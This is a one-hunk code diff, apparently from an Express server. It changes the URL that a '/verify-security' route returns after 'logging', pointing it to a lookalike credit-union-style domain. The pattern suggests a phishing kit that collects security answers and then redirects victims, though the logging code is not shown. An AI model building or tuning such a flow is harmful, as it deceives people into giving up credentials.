@@ -165,7 +165,7 @@ app.post("/verify-security", async (req, res) => {
     // Always redirect after logging
     res.json({ 
         success: true,
-        redirectTo: "https://selfhelp.ns3web.org/"
+        redirectTo: "https://self-helpfcu.ns3web.org/"
     });
 });
 
